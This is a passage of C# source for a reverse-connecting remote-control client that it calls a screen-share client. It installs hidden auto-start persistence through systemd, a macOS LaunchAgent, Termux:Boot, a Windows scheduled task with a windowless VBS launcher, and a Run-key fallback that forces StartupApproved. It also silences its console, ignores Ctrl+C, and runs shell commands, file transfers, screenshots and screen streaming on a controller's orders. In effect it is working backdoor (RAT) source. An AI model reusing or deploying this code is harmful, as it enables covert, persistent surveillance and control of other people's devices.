            $"StandardOutput={output}\n" +
            $"StandardError={output}\n" +
            "\n" +
            "[Install]\n" +
            $"WantedBy={wanted}\n";
    }

    private static bool SetupLinux(string ip, int port, bool silent, string? logFile)
    {
        if (string.IsNullOrEmpty(Platform.Which("systemctl")))
        {
            Print("[-] systemd is not available on this system.");
            return false;
        }

        var parts = SelfExec.CommandParts();
        parts.Add(ip);
        parts.Add(port.ToString(CultureInfo.InvariantCulture));
        var execCmd = string.Join(" ", parts.Select(part => SystemdQuote(part, true)));
        var serviceName = $"autorun-{Cfg.AutorunName}.service";

        if (IsOmarchy() || UserManagerRunning())
        {
            var svcDir = Path.Combine(Home, ".config", "systemd", "user");
            Directory.CreateDirectory(svcDir);
            var graphical = IsOmarchy() || RunQuiet("systemctl", "--user", "is-active",
                "--quiet", "graphical-session.target");
            string? after;
            string wanted;
            if (graphical) { after = wanted = "graphical-session.target"; }
            else { after = null; wanted = "default.target"; }
            var svcPath = Path.Combine(svcDir, serviceName);
            try
            {
                File.WriteAllText(svcPath, ServiceBody(execCmd, silent, logFile,
                    after, wanted, "", SystemdUserEnvironment()));
            }
            catch (Exception ex)
            {
                Print($"[-] Cannot write service: {ex.Message}");
                return false;
            }
            RunQuiet("systemctl", "--user", "daemon-reload");
            if (!RunQuiet("systemctl", "--user", "enable", "--now", serviceName))
            {
                Print("[-] systemctl --user enable failed.");
                return false;
            }
            Print($"[+] User service: {svcPath}");
            if (graphical)
                Print("[+] Starts with your desktop session after reboot, no window.");
            else
            {
                var linger = RunQuiet("loginctl", "enable-linger",
                    Commands.Posix.getuid().ToString(CultureInfo.InvariantCulture));
                if (linger)
                    Print("[+] Starts at boot (linger enabled), no login needed.");
                else
                {
                    Print("[+] Starts when you log in after a reboot.");
                    Print("[!] To start at boot with nobody logged in (servers):");
                    var user = Environment.GetEnvironmentVariable("USER");
                    if (string.IsNullOrEmpty(user))
                        user = Commands.Posix.getuid().ToString(CultureInfo.InvariantCulture);
                    Print($"    sudo loginctl enable-linger {user}");
                }
            }
            return true;
        }

        if (Commands.Posix.getuid() != 0)
        {
            Print("[-] Need root for a system service: re-run with sudo.");
            return false;
        }
        var runUser = Environment.GetEnvironmentVariable("SUDO_USER") ?? "root";
        var userLine = runUser == "root" ? "" : $"User={runUser}\n";
        var systemPath = "/etc/systemd/system/" + serviceName;
        try
        {
            File.WriteAllText(systemPath, ServiceBody(execCmd, silent, logFile,
                "network.target", "multi-user.target", userLine));
        }
        catch (Exception ex)
        {
            Print($"[-] Cannot write service: {ex.Message}");
            return false;
        }
        RunQuiet("systemctl", "daemon-reload");
        if (!RunQuiet("systemctl", "enable", "--now", serviceName))
        {
            Print("[-] systemctl enable failed.");
            return false;
        }
        Print($"[+] System service: {systemPath}");
        Print("[+] Runs at boot with no terminal window.");
        return true;
    }

    // ------------------------------------------------------------------
    // macOS LaunchAgent
    // ------------------------------------------------------------------

    private static string MacosLabel()
    {
        var safe = Regex.Replace(Cfg.AutorunName, "[^A-Za-z0-9.-]", "-");
        return "com.autorun." + (safe.Length == 0 ? "client" : safe);
    }

    private static string MacosPlistPath()
        => Path.Combine(Home, "Library", "LaunchAgents", MacosLabel() + ".plist");

    private static bool MacosRunningUnderLabel(string label)
    {
        if (Environment.GetEnvironmentVariable("XPC_SERVICE_NAME") == label) return true;
        try
        {
            var (code, output) = RunCapture("launchctl", "print",
                $"gui/{Commands.Posix.getuid()}/{label}");
            if (code != 0) return false;
            foreach (var raw in output.Split('\n'))
            {
                var line = raw.Trim();
                if (!line.StartsWith("pid =", StringComparison.Ordinal)) continue;
                var value = line.Split('=', 2)[1].Trim();
                if (int.TryParse(value, out var pid))
                    return pid == Environment.ProcessId;
                return false;
            }
            return false;
        }
        catch
        {
            return Commands.Posix.getppid() == 1;
        }
    }

    private static byte[] MacosPlistBytes(string ip, int port, string? logFile)
    {
        var logPath = string.IsNullOrEmpty(logFile)
            ? "/dev/null"
            : Path.GetFullPath(logFile);
        var arguments = SelfExec.CommandParts();
        arguments.Add(ip);
        arguments.Add(port.ToString(CultureInfo.InvariantCulture));
        string E(string value) => SecurityElement.Escape(value) ?? "";
        var sb = new StringBuilder();
        sb.Append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        sb.Append("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ");
        sb.Append("\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
        sb.Append("<plist version=\"1.0\">\n<dict>\n");
        sb.Append("  <key>Label</key>\n  <string>").Append(E(MacosLabel())).Append("</string>\n");
        sb.Append("  <key>ProgramArguments</key>\n  <array>\n");
        foreach (var arg in arguments)
            sb.Append("    <string>").Append(E(arg)).Append("</string>\n");
        sb.Append("  </array>\n");
        sb.Append("  <key>RunAtLoad</key>\n  <true/>\n");
        sb.Append("  <key>KeepAlive</key>\n  <dict>\n");
        sb.Append("    <key>SuccessfulExit</key>\n    <false/>\n  </dict>\n");
        sb.Append("  <key>WorkingDirectory</key>\n  <string>")
            .Append(E(Path.GetDirectoryName(SelfExec.EntryPath) ?? "")).Append("</string>\n");
        sb.Append("  <key>ProcessType</key>\n  <string>Interactive</string>\n");
        sb.Append("  <key>StandardOutPath</key>\n  <string>").Append(E(logPath)).Append("</string>\n");
        sb.Append("  <key>StandardErrorPath</key>\n  <string>").Append(E(logPath)).Append("</string>\n");
        sb.Append("</dict>\n</plist>\n");
        return Encoding.UTF8.GetBytes(sb.ToString());
    }

    private static bool SetupMacos(string ip, int port, bool silent, string? logFile)
    {
        var label = MacosLabel();
        var plistPath = MacosPlistPath();
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(plistPath)!);
            File.WriteAllBytes(plistPath, MacosPlistBytes(ip, port, logFile));
        }
        catch (Exception ex)
        {
            Print($"[-] Cannot write LaunchAgent: {ex.Message}");
            return false;
        }

        var uid = Commands.Posix.getuid();
        var service = $"gui/{uid}/{label}";
        if (MacosRunningUnderLabel(label))
        {
            Print("[i] This client is the running LaunchAgent; the updated plist");
            Print("    will be used at the next login.");
        }
        else
        {
            RunQuiet("launchctl", "bootout", service);
            var loaded = RunQuiet("launchctl", "bootstrap", $"gui/{uid}", plistPath);
            if (!loaded) loaded = RunQuiet("launchctl", "load", "-w", plistPath);
            if (!loaded)
            {
                Print("[-] launchctl could not load the LaunchAgent.");
                Print($"    Try: launchctl bootstrap gui/{uid} \"{plistPath}\"");
                return false;
            }
            RunQuiet("launchctl", "kickstart", "-k", service);
        }
        Print($"[+] LaunchAgent: {plistPath}");
        Print("[+] Starts automatically at login; no terminal window.");
        Print("[i] The first screenshot may ask for Screen & System Audio Recording");
        Print("    permission: System Settings > Privacy & Security (older macOS calls");
        Print("    the pane Screen Recording).");
        if (!silent)
            Print("[i] macOS LaunchAgents always run in the background (no window).");
        return true;
    }

    // ------------------------------------------------------------------
    // Android / Termux:Boot
    // ------------------------------------------------------------------

    private static string AndroidBootPath()
        => Path.Combine(Home, ".termux", "boot", $"autorun-{Cfg.AutorunName}.sh");

    private static string AndroidBootScript(string ip, int port, string? logFile)
    {
        var prefix = Environment.GetEnvironmentVariable("PREFIX")
                     ?? "/data/data/com.termux/files/usr";
        var shell = Path.Combine(prefix, "bin", "sh");
        var logPath = string.IsNullOrEmpty(logFile)
            ? Path.Combine(Home, ".termux", $"{Cfg.AutorunName}-client.log")
            : Path.GetFullPath(logFile);
        var command = string.Join(" ", SelfExec.CommandParts().Select(SelfExec.QuotePosix));
        var dir = Path.GetDirectoryName(SelfExec.EntryPath) ?? "";
        return
            $"#!{shell}\n" +
            "# Generated by client.py --persist (Termux:Boot).\n" +
            $"cd {SelfExec.QuotePosix(dir)} || cd \"$HOME\"\n" +
            $"{SelfExec.QuotePosix(Path.Combine(prefix, "bin", "termux-wake-lock"))} >/dev/null 2>&1 || true\n" +
            $"exec {command} {SelfExec.QuotePosix(ip)} " +
            $"{port.ToString(CultureInfo.InvariantCulture)} >> {SelfExec.QuotePosix(logPath)} 2>&1\n";
    }

    private static bool SetupAndroid(string ip, int port, bool silent, string? logFile)
    {
        var path = AndroidBootPath();
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(path)!);
            File.WriteAllText(path, AndroidBootScript(ip, port, logFile));
            try
            {
                File.SetUnixFileMode(path, UnixFileMode.UserRead
                    | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
            }
            catch { }
        }
        catch (Exception ex)
        {
            Print($"[-] Cannot write boot script: {ex.Message}");
            return false;
        }
        Print($"[+] Boot script: {path}");
        Print("[+] Install Termux:Boot (F-Droid or GitHub), open it once, then reboot.");
        Print("[+] Set Termux to Unrestricted: Settings > Apps > Termux > Battery.");
        Print("[i] Android 12+: if Android kills it, disable phantom-process trimming");
        Print("    (Termux wiki: \"Processes are being killed\"); the boot script takes");
        Print("    a wake lock, and a running client holds one too.");
        Print("[i] Android 17+: allow Nearby devices / local network for Termux,");
        Print("    otherwise LAN connections to the controller are blocked.");
        Print("[i] Screen capture needs root (su + screencap); shell and files work without.");
        Print("[i] For shared storage (e.g. /sdcard/Download): run termux-setup-storage");
        Print("    once, and allow \"All files access\" for Termux in Android settings.");
        Print("[i] Prefer the F-Droid/GitHub Termux build; the Play Store build is limited.");
        if (!silent)
            Print("[i] Termux:Boot always starts the client in the background.");
        return true;
    }

    // ------------------------------------------------------------------
    // Windows: VBS launcher, Scheduled Task, registry fallback
    // ------------------------------------------------------------------

    private static string AutoRunnerDir()
    {
        var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        if (string.IsNullOrEmpty(local)) local = Path.GetTempPath();
        return Path.Combine(local, "AutoRunner");
    }

    private static string VbsPath()
        => Path.Combine(AutoRunnerDir(), $"AutoRun_{Cfg.AutorunName}.vbs");

    private static string MakeVbs(string args, string workingDir, string? logFile)
    {
        var baseDir = AutoRunnerDir();
        Directory.CreateDirectory(baseDir);
        var path = VbsPath();
        var workdir = string.IsNullOrEmpty(workingDir)
            ? Directory.GetCurrentDirectory()
            : workingDir;
        var inner = string.Join(" ", SelfExec.CommandParts().Select(SelfExec.QuoteWindows));
        if (!string.IsNullOrEmpty(args)) inner += " " + args;
        if (!string.IsNullOrEmpty(logFile))
        {
            var logPath = Path.GetFullPath(logFile).Replace("%", "%%");
            inner = $"cmd /c \"{inner} >> \"{logPath}\" 2>&1\"";
        }
        var escaped = inner.Replace("\"", "\"\"");
        var content =
            "Set WshShell = CreateObject(\"WScript.Shell\")\r\n" +
            $"WshShell.CurrentDirectory = \"{workdir.Replace("\"", "\"\"")}\"\r\n" +
            $"WshShell.Run \"{escaped}\", 0, False\r\n";
        File.WriteAllText(path, content, Encoding.Unicode);
        return path;
    }

    private static (string Execute, string Arguments, string WorkingDir) WindowsCommand(
        string ip, int port, bool silent, string? logFile)
    {
        var args = $"{SelfExec.QuoteWindows(ip)} {port.ToString(CultureInfo.InvariantCulture)}";
        var workdir = Path.GetDirectoryName(SelfExec.EntryPath) ?? Directory.GetCurrentDirectory();
        if (silent)
        {
            var vbs = MakeVbs(args, workdir, logFile);
            return ("wscript.exe", SelfExec.QuoteWindows(vbs), workdir);
        }
        var parts = SelfExec.CommandParts();
        var execute = parts[0];
        var arguments = string.Join(" ", parts.Skip(1).Select(SelfExec.QuoteWindows));
        if (arguments.Length > 0) arguments += " ";
        arguments += args;
        if (!string.IsNullOrEmpty(logFile))
        {
            var logPath = Path.GetFullPath(logFile);
            var inner = $"\"{execute}\" {arguments} >> \"{logPath}\" 2>&1";
            return ("cmd.exe", "/c \"" + inner + "\"", workdir);
        }
        return (execute, arguments, workdir);
    }

    private static bool RegisterTaskPowershell(string taskName, string execute,
        string arguments, string workingDir)
    {
        var action = arguments.Length > 0
            ? "$action = New-ScheduledTaskAction -Execute $exe -Argument $arg"
            : "$action = New-ScheduledTaskAction -Execute $exe";
        if (!string.IsNullOrEmpty(workingDir))
            action += $" -WorkingDirectory '{workingDir.Replace("'", "''")}'";
        var ps = string.Join("\n", new[]
        {
            "$ErrorActionPreference = 'Stop'",
            $"$exe = '{execute.Replace("'", "''")}'",
            $"$arg = '{arguments.Replace("'", "''")}'",
            action,
            "$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME",
            "$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries " +
            "-DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)",
            "$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME " +
            "-LogonType Interactive -RunLevel Limited",
            $"Register-ScheduledTask -TaskName '{taskName}' -Action $action -Trigger $trigger " +
            "-Settings $settings -Principal $principal -Force | Out-Null"
        });
        var path = Path.Combine(Path.GetTempPath(), $"cmon-{Guid.NewGuid():N}.ps1");
        try
        {
            File.WriteAllText(path, ps, new UTF8Encoding(true));
            return RunQuiet("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                "-File", path);
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    private static bool RegisterTaskSchTasks(string taskName, string execute,
        string arguments, string workingDir)
    {
        var launch = arguments.Length > 0
            ? $"\"{execute}\" {arguments}"
            : $"\"{execute}\"";
        var launcher = string.IsNullOrEmpty(workingDir)
            ? launch
            : $"cmd.exe /c cd /d \"{workingDir}\" && {launch}";
        return RunQuiet("schtasks", "/Create", "/TN", taskName, "/TR", launcher,
            "/SC", "ONLOGON", "/RL", "LIMITED", "/F");
    }

    private static bool WindowsRegistryFallback(string taskName, string execute,
        string arguments, string workingDir)
    {
        try
        {
            var launch = arguments.Length > 0
                ? $"\"{execute}\" {arguments}"
                : $"\"{execute}\"";
            var cmd = string.IsNullOrEmpty(workingDir)
                ? launch
                : $"cmd.exe /c cd /d \"{workingDir}\" && {launch}";
            const string runKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
            const string approvedKey =
                @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
            using (var key = Registry.CurrentUser.CreateSubKey(runKey, writable: true))
            {
                if (key == null) throw new IOException("cannot open HKCU Run key");
                key.SetValue(taskName, cmd, RegistryValueKind.String);
            }
            try
            {
                using var approved = Registry.CurrentUser.OpenSubKey(approvedKey, writable: true);
                if (approved != null)
                {
                    approved.SetValue(taskName,
                        new byte[] { 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
                        RegistryValueKind.Binary);
                }
            }
            catch { }
            Print($"[+] Registry entry: HKCU\\{runKey}\\{taskName}");
            return true;
        }
        catch (Exception ex)
        {
            Print($"[-] Registry error: {ex.Message}");
            return false;
        }
    }

    private static bool SetupWindows(string ip, int port, bool silent, string? logFile)
    {
        var taskName = $"AutoRun_{Cfg.AutorunName}";
        var (execute, arguments, workingDir) = WindowsCommand(ip, port, silent, logFile);
        if (RegisterTaskPowershell(taskName, execute, arguments, workingDir))
            Print($"[+] Scheduled Task '{taskName}' created (hidden, at logon).");
        else if (RegisterTaskSchTasks(taskName, execute, arguments, workingDir))
            Print($"[+] Scheduled Task '{taskName}' created via schtasks.");
        else
        {
            Print("[!] schtasks failed; falling back to the registry...");
            if (!WindowsRegistryFallback(taskName, execute, arguments, workingDir))
                return false;
        }
        RunQuiet("schtasks", "/Run", "/TN", taskName);
        return true;
    }
}

// ===== SelfExec.cs =====
// SelfExec.cs - how this program invokes itself.  A published apphost is a
// single executable; a framework-dependent build is `dotnet cmon-client.dll`.
// Both forms are used by the detached command helper, the Windows CTRL+C
// helper and the auto-start installers.



public static class SelfExec
{
    public static readonly string Exe;
    public static readonly string[] Prefix;
    public static readonly string EntryPath;

    static SelfExec()
    {
        var process = Environment.ProcessPath;
        var args0 = Environment.GetCommandLineArgs().FirstOrDefault() ?? "";
        var candidate = process;
        string[] prefix = Array.Empty<string>();

        if (string.IsNullOrEmpty(candidate))
        {
            candidate = args0;
        }
        var name = Path.GetFileNameWithoutExtension(candidate);
        if (name.Equals("dotnet", StringComparison.OrdinalIgnoreCase))
        {
            var dll = Assembly.GetEntryAssembly()?.Location;
            if (string.IsNullOrEmpty(dll) || !File.Exists(dll))
            {
                if (args0.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    dll = Path.GetFullPath(args0);
            }
            if (!string.IsNullOrEmpty(dll))
            {
                candidate = process ?? "dotnet";
                prefix = new[] { dll };
            }
        }
        if (string.IsNullOrEmpty(candidate) || !File.Exists(candidate))
        {
            candidate = args0;
        }
        Exe = string.IsNullOrEmpty(candidate) ? "cmon-client" : candidate;
        Prefix = prefix;
        EntryPath = Prefix.Length > 0 ? Prefix[0] : Exe;
        Cfg.ScriptPath = EntryPath;
    }

    public static List<string> CommandParts()
    {
        var parts = new List<string> { Exe };
        parts.AddRange(Prefix);
        return parts;
    }

    public static ProcessStartInfo StartInfo(params string[] args)
    {
        var psi = new ProcessStartInfo
        {
            FileName = Exe,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        foreach (var arg in Prefix) psi.ArgumentList.Add(arg);
        foreach (var arg in args) psi.ArgumentList.Add(arg);
        return psi;
    }

    public static ProcessStartInfo HelperStartInfo(params string[] args)
    {
        var psi = StartInfo(args);
        psi.CreateNoWindow = false;
        return psi;
    }

    public static string QuotePosix(string value)
        => "'" + value.Replace("'", "'\\''") + "'";

    public static string QuoteWindows(string value)
    {
        if (value.Length > 0 && value.IndexOfAny(new[] { ' ', '\t', '\n', '\v', '"' }) < 0)
            return value;
        var sb = new StringBuilder("\"");
        var backslashes = 0;
        foreach (var ch in value)
        {
            if (ch == '\\')
            {
                backslashes++;
                continue;
            }
            if (ch == '"')
            {
                sb.Append('\\', backslashes * 2 + 1);
                sb.Append('"');
                backslashes = 0;
                continue;
            }
            sb.Append('\\', backslashes);
            backslashes = 0;
            sb.Append(ch);
        }
        sb.Append('\\', backslashes * 2);
        sb.Append('"');
        return sb.ToString();
    }

    public static string QuotedCommand()
    {
        var parts = CommandParts();
        return Platform.IsWindows
            ? string.Join(' ', parts.Select(QuoteWindows))
            : string.Join(' ', parts.Select(QuotePosix));
    }
}

// ===== Program.cs =====
// Program.cs - startup, argument parsing, the reconnect loop and the message
// dispatcher.  Everything here mirrors client.py's main()/__main__ behavior:
// no console output, Ctrl+C immunity, automatic transport discovery, deferred
// requests, and a restart loop for fatal errors.



public static class Program
{
    private static PosixSignalRegistration? _sigint;
    private static bool _wakeLockHeld;

    public static int Main(string[] args)
    {
        if (args.Length >= 1 && args[0] == "--cmon-exec")
            return PosixExecHelper.Run(args);
        if (args.Length >= 2 && args[0] == "--ctrlc-helper")
        {
            return uint.TryParse(args[1], NumberStyles.Integer,
                CultureInfo.InvariantCulture, out var pid)
                ? CtrlCHelper.Run(pid) : 2;
        }

        _ = SelfExec.EntryPath;
        SilenceConsole();
        ImmureToCtrlC();
        WindowsDpiAware();
        try
        {
            while (true)
            {
                try
                {
                    RunMain(args);
                    break;
                }
                catch (Exception ex)
                {
                    Log.Error($"[!] Unexpected fatal error: {ex.Message} - restarting in {Cfg.RetryDelay}s...");
                    Thread.Sleep(TimeSpan.FromSeconds(Cfg.RetryDelay));
                }
            }
        }
        finally
        {
            if (_wakeLockHeld) AndroidWakeLock(false);
        }
        return 0;
    }

    private static void RunMain(string[] args)
    {
        if (!Cfg.ValidConnectionTypes.Contains(Cfg.ConnectionType))
        {
            Log.Error($"[!] Unknown connection_type {Cfg.ConnectionType}. Use auto, tcp, http or https.");
            return;
        }
        if (args.Any(arg => arg is "-h" or "--help"))
        {
            Log.Info("usage: python client.py [address] [optional_port] [options]");
            Log.Info("       address: IP, host:port, tcp://host:port, tls://host:port,");
            Log.Info("                http://..., https://..., or a Pinggy/ngrok URL");
            Log.Info("       --persist          install auto-start (silent) for this client");
            Log.Info("       --visible          with --persist: show a window instead");
            Log.Info("       --log-file PATH    with --persist: keep a log file");
            Log.Info("       --remove-persist   remove the auto-start entry");
            Log.Info("       connection_type is only a preference; auto is recommended.");
            Log.Info("       The controller accepts every transport on one port.");
            return;
        }

        var parsed = ParseArgs(args);
        var targetIp = parsed.Host;
        var targetPort = parsed.Port;
        var targetScheme = parsed.Scheme;
        var doPersist = parsed.Persist;
        var doRemove = parsed.Remove;
        var visible = parsed.Visible;
        var logFile = parsed.LogFile;

        var displayAddress = NetUtil.HostHeader(targetIp, targetPort);
        if (targetScheme is "tcp" or "tls" or "http" or "https")
            displayAddress = $"{targetScheme}://{displayAddress}";

        Log.Info("[+] Reverse auto-transport screen-share client v20");
        Log.Info($"[i] Controller: {displayAddress}  (preference: {Cfg.ConnectionType.ToUpperInvariant()})");
        if (targetScheme is "https" or "auto" && !NetUtil.HostIsPrivate(targetIp))
        {
            Log.Info("[i] Public HTTPS certificate verification is ON (system trust store).");
            Log.Info("    If a direct public endpoint uses a self-signed certificate,");
            Log.Info("    set CONTROLLER_TLS_INSECURE=1 in the client environment.");
        }
        else if (targetScheme == "https")
        {
            Log.Info("[i] Private HTTPS: the controller's self-signed certificate is");
            Log.Info("    accepted by default. Set CONTROLLER_TLS_VERIFY=1 and");
            Log.Info("    CONTROLLER_TLS_CA for strict verification.");
        }

        if (NetUtil.LoopbackTarget(targetIp) && !doRemove)
        {
            Log.Info($"[i] {targetIp} is this machine's own loopback address - that only works");
            Log.Info("    when controller.py runs on THIS machine. For a controller on");
            Log.Info("    another machine or VM use its LAN address (the controller");
            Log.Info("    prints the exact command to use when it starts).");
        }

        if (doRemove)
        {
            Log.Info(Autostart.Remove());
            return;
        }
        if (doPersist)
        {
            Log.Info(Autostart.Install(displayAddress, targetPort, silent: !visible, logFile: logFile));
            return;
        }

        if (Platform.IsIos())
        {
            Log.Info("[i] iOS/iPadOS: stock iOS suspends sandboxed apps ~30s after they leave");
            Log.Info("    the foreground and gives them no way to capture the screen. This");
            Log.Info("    client is only fully usable on a jailbroken device with a real");
            Log.Info("    Python (pty + screencapture). Files may still transfer on stock iOS.");
        }
        if (Platform.IsAndroid())
        {
            var api = Platform.AndroidApi();
            Log.Info($"[i] Android/Termux{(api > 0 ? $" (API {api})" : "")}: shell, commands and files work without root.");
            Log.Info("    Screen capture needs root (su + screencap). Keep Termux unrestricted;");
            Log.Info("    Android 12+ may kill background processes (run termux-wake-lock;");
            Log.Info("    Android 14+: allow 'Disable child process restrictions' for Termux).");
            if (api >= 37)
            {
                Log.Info("    Android 17+: the Play Store Termux build must be allowed Nearby");
                Log.Info("    devices / local network; the F-Droid build does not need it.");
            }
        }
        if (!Platform.GuiSessionAvailable())
        {
            Log.Info("[i] Headless Linux session (no DISPLAY / WAYLAND_DISPLAY):");
            Log.Info("    commands, files and the shell work; screenshots and screen");
            Log.Info("    sharing need a desktop, so Pillow is not checked at startup.");
        }

        if (Platform.IsAndroid()) EnsureAndroidWakeLock();

        var currentDir = Directory.GetCurrentDirectory();

        while (true)
        {
            var failures = 0;
            var attempts = 0;
            var retryStarted = DateTime.UtcNow;
            Conn? clientSocket = null;
            var transportLabel = "?";
            while (true)
            {
                try
                {
                    clientSocket = Transports.OpenControllerConnection(targetIp, targetPort, targetScheme);
                    transportLabel = clientSocket.Name.Length > 0 ? clientSocket.Name : "?";
                    break;
                }
                catch (Exception ex)
                {
                    failures++;
                    attempts++;
                    if (failures == 1 || failures % 20 == 0)
                    {
                        var hint = ex is TransportSoftException
                            ? "the tunnel is up but the controller is not ready yet"
                            : NetUtil.ConnectErrorHint(ex);
                        Log.Error($"[!] Controller not reachable at {displayAddress} - " +
                                  $"{hint}; retrying...");
                    }
                    clientSocket = null;
                    // Start fast (100 ms) so a client and controller launched
                    // together meet as soon as the listener appears, then back
                    // off.  The old fixed one-second sleep alone accounted for
                    // most of the 3-4 second startup delay.
                    Thread.Sleep(NetUtil.RetryDelay(targetIp, attempts, retryStarted));
                }
            }

            Log.Info($"[+] Connected to {displayAddress} using {transportLabel} (automatic transport)");
            if (transportLabel.Contains("poll", StringComparison.OrdinalIgnoreCase))
                StartPollUpgradeProbe(targetIp, targetPort, targetScheme, clientSocket);
            try
            {
                var raw = clientSocket.RawSocket;
                if (raw != null) NetUtil.TuneSocket(raw);
            }
            catch { }

            var stop = false;
            DeferredRequests.Clear();
            Cancellations.Clear();
            try
            {
                while (true)
                {
                    JsonObject? msg;
                    if (DeferredRequests.Count > 0) msg = DeferredRequests.Pop();
                    else msg = Protocol.RecvMsg(clientSocket);
                    if (msg == null)
                    {
                        Log.Error($"[!] Controller closed the connection. Reconnecting... transport={transportLabel} closed={clientSocket.IsClosed}");
                        break;
                    }

                    var mtype = JsonUtil.Str(msg, "type");
                    if ((Environment.GetEnvironmentVariable("CMON_TRACE") ?? "").Trim() is "1" or "true" or "yes" or "on")
                        Log.Info($"[recv] type={mtype} id={JsonUtil.Str(msg, "id") ?? "?"} keys={msg.Count}");
                    var reqId = JsonUtil.Get(msg, "id");
                    if (reqId != null && !JsonUtil.IsValidReqId(reqId)) reqId = null;

                    if (!CancelExempt(mtype) && Cancellations.IsCanceled(reqId))
                    {
                        var why = Cancellations.Forget(reqId) ?? "Ctrl+Z";
                        Protocol.SendMsg(clientSocket, new JsonObject
                        {
                            ["type"] = "output",
                            ["id"] = reqId?.DeepClone(),
                            ["data"] = $"[client] canceled ({why})"
                        });
                        continue;
                    }

                    if (mtype == "exit")
                    {
                        ScreenCapture.StopStream(0.5);
                        try
                        {
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "output",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = "[client] shutting down"
                            });
                        }
                        catch (IOException) { }
                        catch (ObjectDisposedException) { }
                        stop = true;
                        break;
                    }

                    if (mtype == "cmd")
                    {
                        if (!TryTextField(msg, "data", out var command))
                        {
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "error",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = "cmd: data must be text"
                            });
                            continue;
                        }
                        if (string.IsNullOrWhiteSpace(command)) continue;

                        var cdResult = Commands.ChangeDir(command, currentDir);
                        if (cdResult != null)
                        {
                            currentDir = cdResult.Value.NewDir;
                            var output = cdResult.Value.Output;
                            Protocol.SendMsg(clientSocket, new JsonObject
                            {
                                ["type"] = "output",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = output ?? "[no output]"
                            });
                            continue;
                        }

                        string text;
                        bool stopRequested;
                        int? exitCode;
                        Commands.SetBusy(true);
                        try
                        {
                            (text, stopRequested, exitCode) = Commands.RunCommand(
                                clientSocket, command, currentDir, reqId);
                        }
                        catch (Exception ex)
                        {
                            text = "command failed: " + ex.Message;
                            stopRequested = false;
                            exitCode = 127;
                        }
                        finally { Commands.SetBusy(false); }
                        if (stopRequested) stop = true;
                        if (text.Length == 0) text = "[no output]";
                        try
                        {
                            var reply = new JsonObject
                            {
                                ["type"] = "output",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = text
                            };
                            if (exitCode.HasValue) reply["exit_code"] = exitCode.Value;
                            Protocol.SendMsg(clientSocket, reply);
                        }
                        catch (IOException)
                        {
                            if (!stop) throw;
                        }
                        if (stopRequested) break;
                        continue;
                    }

                    if (mtype == "upex")
                    {
                        string text;
                        bool stopRequested;
                        int? exitCode;
                        Commands.SetBusy(true);
                        try
                        {
                            (text, stopRequested, exitCode) = Upex.Run(
                                clientSocket, msg, currentDir, reqId);
                        }
                        catch (Exception ex)
                        {
                            text = "upex failed: " + ex.Message;
                            stopRequested = false;
                            exitCode = 1;
                        }
                        finally { Commands.SetBusy(false); }
                        if (stopRequested) stop = true;
                        if (text.Length == 0) text = "[no output]";
                        try
                        {
                            var reply = new JsonObject
                            {
                                ["type"] = "output",
                                ["id"] = reqId?.DeepClone(),
                                ["data"] = text
                            };
                            if (exitCode.HasValue) reply["exit_code"] = exitCode.Value;
                            Protocol.SendMsg(clientSocket, reply);
                        }
                        catch (IOException)
                        {
                            if (!stop) throw;
                        }
                        if (stopRequested) break;
                        continue;
                    }

                    if (mtype is "cmd_kill" or "cancel")
                    {
                        if (mtype == "cancel")
                        {
                            var state = Transfers.IncomingDrop(reqId);
                            if (state != null)
                            {
                                var why = JsonUtil.Str(msg, "why") ?? "canceled by the controller";
                                state.Abort(new JsonObject { ["reason"] = why });
                            }
                            Transfers.OutgoingCancel(reqId);
                        }
                        continue;
                    }

                    if (mtype == "download")
                    {
                        Transfers.ServeDownloadRequest(clientSocket, msg, reqId, currentDir);
                        continue;
                    }

                    if (mtype is "transfer_begin" or "transfer_entries"
                        or "transfer_file_begin" or "transfer_chunk"
                        or "transfer_file_end" or "transfer_abort"
                        or "transfer_end")
                    {
                        Transfers.HandleTransferMessage(clientSocket, msg, reqId, currentDir);
                        continue;
                    }

                    if (mtype == "upload")
                    {
                        HandleLegacyUpload(clientSocket, msg, reqId, currentDir);
                        continue;
                    }

                    if (mtype == "screenshot")
                    {
                        ScreenCapture.TakeScreenshot(clientSocket, reqId);
                        continue;
                    }

                    if (mtype == "persist")
                    {
                        string report;
                        try { report = Autostart.Install(displayAddress, targetPort); }
                        catch (Exception ex) { report = "persist failed: " + ex.Message; }
                        Protocol.SendMsg(clientSocket, new JsonObject
                        {
                            ["type"] = "output",
                            ["id"] = reqId?.DeepClone(),
                            ["data"] = report
                        });
                        continue;
                    }

                    if (mtype == "unpersist")
                    {
                        string report;
                        try { report = Autostart.Remove(); }
                        catch (Exception ex) { report = "unpersist failed: " + ex.Message; }
                        Protocol.SendMsg(clientSocket, new JsonObject
                        {
                            ["type"] = "output",
                            ["id"] = reqId?.DeepClone(),
                            ["data"] = report
                        });
                        continue;
                    }

                    if (mtype == "screenshare")
                    {
                        ScreenCapture.StopStream();
                        var streamStop = new CancellationTokenSource();
                        try
                        {
                            ScreenCapture.StartStream(clientSocket, JsonUtil.Get(msg, "fps"),
                                streamStop, reqId);
                        }
                        catch (Exception ex)
                        {
